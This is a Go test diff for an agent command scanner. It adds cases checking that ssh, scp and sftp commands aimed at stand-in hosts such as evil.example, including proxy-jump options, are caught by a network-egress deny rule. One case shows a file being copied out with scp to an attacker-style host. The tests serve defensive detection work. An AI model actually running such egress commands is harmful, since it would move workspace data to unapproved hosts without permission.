@@ -210,6 +210,42 @@ func TestScannerAdditionalBranches(t *testing.T) {
 			rule: ruleNetworkEgress,
 		},
 		{
+			name: "ssh identity option before target host",
+			req: Request{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspaceExec,
+				Command:  "ssh -i key user@evil.example",
+			},
+			rule: ruleNetworkEgress,
+		},
+		{
+			name: "ssh port option before target host",
+			req: Request{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspaceExec,
+				Command:  "ssh -p 2222 evil.example",
+			},
+			rule: ruleNetworkEgress,
+		},
+		{
+			name: "scp identity option before target host",
+			req: Request{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspaceExec,
+				Command:  "scp -i key ./x user@evil.example:/tmp/x",
+			},
+			rule: ruleNetworkEgress,
+		},
+		{
+			name: "sftp port option before target host",
+			req: Request{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspaceExec,
+				Command:  "sftp -P 2222 evil.example",
+			},
+			rule: ruleNetworkEgress,
+		},
+		{
 			name: "nc target host",
 			req: Request{
 				ToolName: "workspace_exec",
@@ -328,6 +364,65 @@ func TestScannerAdditionalBranches(t *testing.T) {
 	})
 	require.Equal(t, DecisionDeny, report.Decision)
 	require.True(t, hasRule(report, ruleNetworkEgress))
+}
+
+func TestSSHLikeHostsFindRemoteTargets(t *testing.T) {
+	require.Equal(t,
+		[]string{"evil.example"},
+		schemelessNetworkHosts("ssh -i key -p 2222 user@evil.example"),
+	)
+	require.Equal(t,
+		[]string{"evil.example"},
+		schemelessNetworkHosts("sftp -P 2222 evil.example"),
+	)
+	require.Equal(t,
+		[]string{"evil.example"},
+		schemelessNetworkHosts("scp -i key archive.tar.gz user@evil.example:/tmp/archive.tar.gz"),
+	)
+	require.Equal(t,
+		[]string{"good.example"},
+		schemelessNetworkHosts("ssh good.example evil.example"),
+	)
+	require.Equal(t,
+		[]string{"jump.evil", "allowed.example"},
+		schemelessNetworkHosts("ssh -J jump.evil allowed.example"),
+	)
+	require.Equal(t,
+		[]string{"jump.evil", "allowed.example"},
+		schemelessNetworkHosts("scp -o ProxyJump=jump.evil ./x allowed.example:/tmp/x"),
+	)
+}
+
+func TestSSHLikeOptionHostsCheckedAgainstAllowlist(t *testing.T) {
+	p := DefaultPolicy()
+	p.AllowedDomains = []string{"allowed.example"}
+	scanner := NewScanner(p)
+
+	tests := []string{
+		"ssh -J jump.evil allowed.example",
+		"scp -o ProxyJump=jump.evil ./x allowed.example:/tmp/x",
+	}
+	for _, command := range tests {
+		t.Run(command, func(t *testing.T) {
+			report := scanner.Scan(context.Background(), Request{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspaceExec,
+				Command:  command,
+			})
+			require.Equal(t, DecisionDeny, report.Decision)
+			require.True(t, hasRule(report, ruleNetworkEgress), report.Findings)
+			require.True(t, hasFindingEvidence(report, ruleNetworkEgress, "jump.evil"), report.Findings)
+		})
+	}
+}
+
+func hasFindingEvidence(report Report, rule, evidence string) bool {
+	for _, f := range report.Findings {
+		if f.RuleID == rule && strings.Contains(f.Evidence, evidence) {
+			return true
+		}
+	}
+	return false
 }
 
 func TestPermissionPolicyAdditionalBranches(t *testing.T) {
